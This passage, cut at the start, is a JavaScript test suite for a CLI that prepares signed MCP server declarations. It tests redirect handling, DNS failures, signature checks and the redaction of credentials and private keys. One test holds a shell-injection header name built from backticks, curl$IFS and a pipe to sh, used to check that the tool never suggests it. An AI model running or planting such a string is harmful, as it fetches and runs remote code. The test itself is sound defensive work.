  }, { env: ENV });
  // A URL template in the listing.
  const tpl = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://{tenant}.example.com/mcp', variables: { tenant: { isRequired: true } } }] });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: tpl } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 29, r.stdout + r.stderr);
    assert.match(r.stdout, /a remote that is a URL template cannot be declared in format addon-declaration\/0\.2: a declaration names the concrete URLs a client connects to/);
    assert.match(r.stdout, /name that URL in "remotes" of the server\.json of 1\.0\.1 \(no \{\.\.\.\} and no "variables"\) and give that file with --server-json <server\.json>/);
    assert.ok(!/fix the remote in the server\.json/.test(r.stdout), 'the general advice is not repeated');
  });
  // --no-pointer: the listed version keeps its template.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: tpl } }), site: baseSite() }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--out', freshOut()], (r) => {
    assert.equal(r.code, 29, r.stdout + r.stderr);
    assert.match(r.stdout, /the listed version keeps its template remote, so no declaration can be made for it/);
  });
});

test('resolve.js: the hardened fetch says why a host lookup failed and the status of an oversized body; hostWithoutAddress asks A and AAAA', async () => {
  await assert.rejects(httpsRequest('https://nowhere.example/x', { lookupAll: async () => { throw Object.assign(new Error('x'), { code: 'ENOTFOUND' }); }, attempts: 1 }), (e) => e.hostLookupCode === 'ENOTFOUND' && /could not resolve host \(ENOTFOUND\)/.test(e.message));
  const seen = [];
  const st = await serve({ '/big': { status: 404, headers: { 'Content-Type': 'text/html' }, body: 'q'.repeat(5000) } }, seen);
  try {
    await assert.rejects(httpsRequest(`http://127.0.0.1:${st.port}/big`, { allowLoopbackHttp: true, maxBytes: 4096 }), (e) => e.tooLarge === true && e.status === 404);
  } finally {
    await st.close();
  }
  const err = (code) => async () => { throw Object.assign(new Error(code), { code }); };
  const fake = (a, aaaa) => ({ resolve4: typeof a === 'function' ? a : async () => a, resolve6: typeof aaaa === 'function' ? aaaa : async () => aaaa });
  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ENODATA')) })).noAddress, true);
  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENOTFOUND'), err('ENOTFOUND')) })).noAddress, true);
  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ETIMEOUT')) })).noAddress, false);
  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ESERVFAIL'), err('ENODATA')) })).noAddress, false);
  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(['203.0.113.7'], err('ENODATA')) })).noAddress, false);
  assert.match((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ETIMEOUT')) })).detail, /A query with ENODATA and the AAAA query with ETIMEOUT/);
});

// ---- review of the field study fixes (20 November 2026) ----

test('review: a permanent redirect at latest.json into a declaration folder is not read as no previous declaration', async () => {
  const byHashUrl = `https://${HOST}${folder}by-hash/${hex(d2)}.json`;
  const big = 'r'.repeat(20000);
  const cases = [
    ['301 to a by-hash file', { status: 301, headers: { Location: byHashUrl }, body: '' }],
    ['308 to itself', { status: 308, headers: { Location: 'latest.json' }, body: '' }],
    ['301 to the folder on another host', { status: 301, headers: { Location: `https://www.example.com${folder.toUpperCase()}latest.json` }, body: '' }],
    ['301 with a large body', { status: 301, headers: { Location: byHashUrl, 'Content-Type': 'text/html' }, body: big }],
  ];
  for (const [label, answer] of cases) {
    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
      assert.equal(r.json.state, 'previous_unreadable');
      assert.ok(r.json.reasons.some((x) => /which is inside a declaration folder, so a declaration may be served behind it/.test(x)), label);
      assert.ok(r.json.reasons.some((x) => /serve latest\.json itself with HTTP status 200 and no redirect/.test(x)), label);
      assert.ok(!NO_DASH.test(r.json.reasons.join(' ').replace(/--[a-z]/g, '')));
    });
  }
  // A redirect out of the declaration folders is still read as no previous declaration.
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'redirect');
  });
});

test('review: before a redirect, a large body or a host with no address is read as no previous declaration, the registry list of versions is read', async () => {
  // The newest version (1.0.1) was published without the pointer 1.0.0 carries.
  const dropped = {
    [regPath()]: { body: listingFor({ version: '1.0.1' }) },
    [versionsPath()]: versionsList(listingFor({ pointerTo: d2, isLatest: false }), listingFor({ version: '1.0.1' })),
  };
  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
  const noAddress = { hostWithoutAddress: async () => ({ noAddress: true, detail: 'the name servers answered the A query with ENOTFOUND and the AAAA query with ENOTFOUND' }) };
  const cases = [
    ['301 out of the folder', { site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }],
    ['200 over 16384 bytes', { site: baseSite({ [latestPath]: { status: 200, headers: { 'Content-Type': 'text/html' }, body: '<html>' + 'w'.repeat(20000) } }) }],
    ['host with no address', { site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }],
  ];
  for (const [label, opts] of cases) {
    const out = freshOut();
    await scenario({ registry: dropped, ...opts }, [NAME, '--for-version', '1.0.2', '--tools', TOOLS_FILE, '--out', out, '--json'], (r, w) => {
      assert.equal(r.code, 36, `${label}: ${r.stdout}${r.stderr}`);
      assert.equal(r.json.state, 'previous_not_linkable');
      assert.equal(r.json.declaration, null);
      assert.ok(r.json.reasons.some((x) => /but version 1\.0\.0 of com\.example\/weather names one \(https:\/\/example\.com\/.*by-hash\/.*\): a history of declarations exists, and the newest version was published without its pointer/.test(x)), `${label}: ${r.json.reasons.join('\n')}`);
      assert.ok(r.json.reasons.some((x) => /give --no-previous to start a new history on purpose/.test(x)));
      assert.ok(w.seen.some((s) => s.path === versionsPath()), 'the list of versions was read');
    });
    assert.deepEqual(filesUnder(out), [], `${label}: nothing written`);
  }
  // A list of versions that cannot be read in full, or does not fit the listing, stops the run too.
  const unreadable = [
    ['not served', null, /the registry answered HTTP 404/],
    ['more pages', { body: { servers: [listingFor()], metadata: { count: 1, nextCursor: 'p2' } } }, /the list has more than one page/],
    ['another name', versionsList(listingFor({ name: 'com.example/other' })), /an entry of the list is not a listing of com\.example\/weather/],
    ['no listed version', versionsList(listingFor({ version: '0.9.0' })), /the list does not hold the listed version 1\.0\.0/],
    ['not JSON', { headers: { 'Content-Type': 'text/html' }, body: '<html>' }, /not strict JSON/],
  ];
  for (const [label, route, why] of unreadable) {
    const registry = { [regPath()]: { body: listingFor() }, ...(route ? { [versionsPath()]: route } : {}) };
    await scenario({ registry, site: baseSite({ [latestPath]: { status: 308, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
      assert.match(r.stdout, why, label);
      assert.match(r.stdout, /give --no-previous to make this the first one/, label);
    });
  }
  // A plain 404 at latest.json does not read the list (as before).
  await scenario({ registry: { [regPath()]: { body: listingFor() } }, site: baseSite() }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!w.seen.some((s) => s.path === versionsPath()));
  });
});

test('review: a declaration for this name at latest.json that fails its checks stops the run when the listing names none', async () => {
  // Issued later than --now (clock skew): not_yet_valid.
  const later = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, issuedAt: '2026-11-20T11:00:00Z' }, k.loaded);
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text(later) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'not_yet_valid');
    assert.ok(r.json.reasons.some((x) => /holds a declaration for com\.example\/weather, sha256:[0-9a-f]{64}, that cannot be linked as previous: it was issued at 2026-11-20T11:00:00Z/.test(x)), r.json.reasons.join('\n'));
    assert.ok(!r.json.notes.some((n) => /makes the first declaration/.test(n)), 'no note calls it the first declaration');
  });
  // A changed member (the signature no longer matches): invalid_signature.
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text({ ...d2, contact: 'mailto:x@example.com' }) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'invalid_signature');
  });
  // A declaration for another server is not one for this name: a first declaration, as before.
  const other = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, name: 'com.example/other' }, k.loaded);
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text(other) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.result, 'invalid');
  });
});

test('review: NEXT_STEPS.txt names a redirect or a host with no address; a plain 404 gets the note; a body cut short stops the run', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: ENV });
  let next = fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8');
  assert.match(next, /When prepare ran, https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/latest\.json answered with a permanent redirect\. check-listing follows no redirect, and a browser follows one without showing it/);
  assert.match(next, /such as curl -sI https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/by-hash\/[0-9a-f]{64}\.json: the first line must show status 200/);
  assert.match(next, /check-listing reports declaration_unreachable/);
  assert.ok(!NO_DASH.test(next.replace(/--?[a-zA-Z]/g, '')), 'no dash punctuation');
  assert.ok(!/\b(never|guaranteed|safe|secure|trusted)\b/i.test(next));
  // A host with no address.
  const out2 = freshOut();
  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: { hostWithoutAddress: async () => ({ noAddress: true, detail: 'x' }) } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out2], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: ENV });
  next = fs.readFileSync(path.join(out2, 'NEXT_STEPS.txt'), 'utf8');
  assert.match(next, /When prepare ran, example\.com had no address in DNS\. Give it an address and serve these files there before the next step/);
  // A plain 404 (no redirect): no such line in NEXT_STEPS.txt, and the note says what was seen.
  const out3 = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out3, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(r.json.notes.some((n) => n === `https://${HOST}${folder}latest.json answered HTTP 404. The listing of 1.0.0 names no declaration, so this run makes the first declaration for this server. The files this run writes for upload are to be served in https://${HOST}${folder}, each with HTTP status 200 and no redirect. If you served a declaration at that address before, do not use the files of this run: serve that declaration there again and run prepare again, so the new one follows it`), r.json.notes.join('\n'));
  }, { env: ENV });
  assert.ok(!/When prepare ran/.test(fs.readFileSync(path.join(out3, 'NEXT_STEPS.txt'), 'utf8')));
  // A close delimited 200 answer cut short in the middle of a declaration.
  const cut = (req) => req.socket.end('HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: application/json\r\n\r\n' + text(d2).slice(0, 200));
  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: cut }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
    assert.equal(r.code, 35, r.stdout + r.stderr);
    assert.match(r.stdout, /answered HTTP 200 with a body that begins as a declaration but does not parse/);
  });
});

test('review: a token typed in place of the variable name is not repeated', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', `Authorization=${TOKEN}`, '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 1, r.stdout + r.stderr);
    assert.ok(!r.stderr.includes(TOKEN) && !r.stdout.includes(TOKEN), r.stderr);
    assert.match(r.stderr, /the environment variable given after "=" \(what was given is not repeated\) is not set/);
    assert.equal(w.seen.length, 0);
  }, { env: {} });
  // A variable whose name is not in the usual upper case form: not repeated in the note either.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(BEARER) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=lower_case_name', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!r.stdout.includes('lower_case_name'));
    assert.match(r.stdout, /the value from the variable given for Authorization, not shown/);
  }, { env: { lower_case_name: BEARER } });
});

test('review: a credential the server repeats is hidden also when the message is cut short', async () => {
  const jwt = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.' + crypto.randomBytes(160).toString('base64url') + '.' + crypto.randomBytes(60).toString('base64url');
  assert.ok(jwt.length > 280);
  const echo = (req, res, body) => {
    const m = JSON.parse(body);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ jsonrpc: '2.0', id: m.id, error: { code: -32001, message: 'invalid token ' + req.headers.authorization } }));
  };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: echo }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=TOK', '--json', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    for (let i = 0; i + 16 <= jwt.length; i++) assert.ok(!r.stdout.includes(jwt.slice(i, i + 16)), `a part of the token at ${i} reached the output`);
    assert.match(r.json.tools.error, /JSON-RPC error -32001 \(invalid token <header value hidden>\)/);
  }, { env: { TOK: `Bearer ${jwt}` } });
  // The client hides before it cuts: a redact function sees the whole message.
  const request = async (url, opts) => {
    const b = JSON.parse(opts.body);
    return { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: b.id, error: { code: -32001, message: 'x'.repeat(150) + jwt } })) };
  };
  await assert.rejects(fetchToolsList(REMOTE, { request, headers: { Authorization: `Bearer ${jwt}` }, redact: (s) => s.split(jwt).join('<hidden>') }), (e) => e.message.includes('<hidden>') && !e.message.includes(jwt.slice(0, 20)));
});

test('review: the header goes to a host outside the namespace, or with another registry, only when --tools-header-host names it', async () => {
  const outside = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://collector.example.net/mcp' }] });
  const got = [];
  const collector = (req, res, body) => (got.push(req.headers.authorization), mcpServer()(req, res, body));
  const site = baseSite({ 'POST collector.example.net/mcp': collector });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /collector\.example\.net is not example\.com \(the domain the namespace names\) or a host under it/);
    assert.match(r.stdout, /run prepare again with --tools-header-host collector\.example\.net as well/);
    assert.ok(!w.seen.some((s) => s.headers.authorization !== undefined), 'nothing carried the header');
  }, { env: { T: 'Bearer secret-token-123456' } });
  assert.deepEqual(got, []);
  // Named: sent.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--tools-header-host', 'collector.example.net', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: { T: 'Bearer secret-token-123456' } });
  assert.deepEqual(got, ['Bearer secret-token-123456']);
  // A subdomain of the namespace domain needs no option.
  const sub = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }] });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: sub } }), site: baseSite({ 'POST mcp.example.com/mcp': guardedMcp(BEARER) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: { T: BEARER } });
  // A registry that is not the official one (here https, served by the site double): the host must be named.
  const regRoutes = { [`registry.example.org${regPath()}`]: { body: listingFor() }, [`registry.example.org${versionsPath()}`]: versionsList(listingFor()) };
  const seenAuth = [];
  await scenario({ registry: {}, site: baseSite({ ...regRoutes, [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--registry', 'https://registry.example.org', '--now', NOW, '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /the listing was read from https:\/\/registry\.example\.org, not from the official registry/);
  }, { env: { T: BEARER }, registryArg: false });
  assert.deepEqual(seenAuth, []);
  await scenario({ registry: {}, site: baseSite({ ...regRoutes, [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--tools-header-host', 'example.com', '--registry', 'https://registry.example.org', '--now', NOW, '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: { T: BEARER }, registryArg: false });
  assert.deepEqual(seenAuth, [BEARER]);
  // The 401 advice names the option for such a host.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site: baseSite({ 'POST collector.example.net/mcp': mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /also give --tools-header-host collector\.example\.net once you have checked that it is your server/);
  });
  // Bad --tools-header-host: refused, not repeated.
  for (const [args, why] of [[['--tools-header-host', 'example.com'], /given only with --tools-header-env/], [['--tools-header-env', 'Authorization=T', '--tools-header-host', TOKEN.toUpperCase()], /takes the lowercase host name/]]) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--dry-run', ...args, '--out', freshOut()], (r, w) => {
      assert.equal(r.code, 1, r.stdout + r.stderr);
      assert.match(r.stderr, why);
      assert.ok(!r.stderr.includes(TOKEN.toUpperCase()));
      assert.equal(w.seen.length, 0);
    }, { env: { T: BEARER } });
  }
});

test('review: the private signing key is not sent as a header', async () => {
  const keyFile = path.join(tmp, 'review-key.hex');
  fs.writeFileSync(keyFile, k.hex + '\n');
  const pemOneLine = k.pem.replace(/\s*\n\s*/g, ' ').trim();
  const cases = [
    [['--key-env', 'K', '--tools-header-env', 'X-API-KEY=K'], { K: k.hex }, /is the one --key-env names, which holds your private key/],
    [['--key-env', 'K', '--tools-header-env', 'X-API-KEY=H'], { K: k.hex, H: k.hex }, /holds private key material/],
    [['--key-env', 'K', '--dry-run', '--tools-header-env', 'Authorization=H'], { K: k.hex, H: `Bearer ${k.hex.toUpperCase()}` }, /holds private key material/],
    [['--key-file', keyFile, '--tools-header-env', 'X-API-KEY=H'], { H: k.hex }, /holds private key material/],
    [['--tools-header-env', 'X-API-KEY=H'], { H: pemOneLine }, /holds private key material/],
  ];
  for (const [args, env, why] of cases) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', ...args, '--out', freshOut()], (r, w) => {
      assert.equal(r.code, 1, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
      assert.match(r.stderr, why, args.join(' '));
      assertNoSecrets(r.stdout, r.stderr);
      assert.ok(!r.stderr.toLowerCase().includes(k.hex.toLowerCase()));
      assert.equal(w.seen.length, 0, 'no request');
    }, { env });
  }
  // A 64 hex API token that is not the key is accepted.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(k2.hex, { headerName: 'x-api-key' }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'K', '--tools-header-env', 'X-API-KEY=H', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: { K: k.hex, H: k2.hex } });
});

test('review: a short header value is not hidden in the output, and the output is not rewritten', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('example', { headerName: 'x-tenant' }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'X-Tenant=T', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!r.stdout.includes('<header value hidden>'), r.stdout);
    assert.match(r.stdout, /read com\.example\/weather 1\.0\.0/);
    assert.match(r.stdout, /https:\/\/example\.com\/mcp/);
    assert.match(r.stdout, /the value of X-Tenant has fewer than 8 characters, so it is read as a setting, not a secret/);
  }, { env: { T: 'example' } });
  // A longer value is hidden in server text only: the rest of the output keeps its words.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('Bearer other', { echo: true }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /bad credential <header value hidden>/);
    assert.match(r.stdout, /read com\.example\/weather 1\.0\.0/);
  }, { env: { T: 'Bearer examplecorp' } });
});

test('review: a declared header name a shell would read is not suggested', async () => {
  const evil = '`curl$IFS' + "'x.example'" + '|sh`';
  const listing = listingFor({ remotes: [{ type: 'streamable-http', url: REMOTE, headers: [{ name: evil }] }] });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listing } }), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.ok(!r.stdout.includes('curl$IFS'), r.stdout);
    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH"/);
  });
});
